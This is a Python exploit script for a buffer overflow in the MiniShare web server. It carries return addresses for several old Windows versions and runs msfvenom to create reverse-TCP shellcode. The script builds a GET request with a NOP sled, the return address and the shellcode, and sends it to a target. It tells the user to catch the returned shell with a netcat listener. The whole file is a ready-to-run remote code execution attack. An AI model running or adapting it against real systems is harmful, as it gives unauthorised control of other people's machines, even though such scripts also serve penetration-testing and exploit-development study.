#!/usr/bin/python
import sys
import socket
import subprocess

# Requires msfvenom
# Return Addresses ported from metasploit https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/minishare_get_overflow.rb
oses = ["Windows 2000 SP0-SP3 English","Windows 2000 SP4 English","Windows XP SP0-SP1 English","Windows XP SP2 English","Windows 2003 SP0 English","Windows 2003 SP1 English","Windows 2003 SP2 English","Windows NT 4.0 SP6","Windows XP SP2 German","Windows XP SP2 Polish","Windows XP SP2 French","Windows XP SP3 French"]
rets = ["\xAB\xA3\x54\x77","\x63\xF1\x17\x75","\x54\x1D\xAB\x71","\x72\x93\xAB\x71","\x4D\x3C\xC0\x71","\x80\x36\x40\x77","\x80\x26\x40\x77","\xF8\x29\xF3\x77","\x0A\xAF\xD5\x77","\x6E\xE2\xD4\x77","\x0A\xAF\xD5\x77","\x53\x93\x3A\x7E"]

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    ret = rets[int(sys.argv[3])]
    localip = sys.argv[4]
    localport = sys.argv[5]
except IndexError:
    print "./minishare_bo.py TargetIP TargetPort OS LocalIP LocalPort"
    print "Compatible OSes:"
    for i in range(len(oses)):
	   print str(i) + "  " + oses[i]
    print "Make sure you have your netcat set up to listen on your port with nc -nlvp [port]" 
    exit()

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "Calling msfvenom to generate payload..."
cmd = "msfvenom -p windows/shell_reverse_tcp LHOST=" + localip + " LPORT=" + localport + " -b \\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x40 -f raw -n 64"
shellcode = subprocess.check_output(cmd, shell=True)
print(r"""
    __  ____       _      __                       ____  ____ 
   /  |/  (_____  (______/ /_  ____ _________     / __ )/ __ \
  / /|_/ / / __ \/ / ___/ __ \/ __ `/ ___/ _ \   / __  / / / /
 / /  / / / / / / (__  / / / / /_/ / /  /  __/  / /_/ / /_/ / 
/_/  /_/_/_/ /_/_/____/_/ /_/\__,_/_/   \___/  /_____/\____/  
                                                                                                                                                                                                                
""") #ASCII art is still cool, right?
exploit = "GET "
exploit += "\x90"*1787
exploit += ret
exploit += shellcode
exploit += " HTTP/1.1\r\n\r\n"
print exploit
print "Sending exploit... check your netcat in a few seconds"
try:
    sock.connect((ip,int(port)))
    sock.send(exploit)
    print "Exploit code sent."
except:
     print "Some error occurred! Is MiniShare running on the given IP/port?"
sock.close()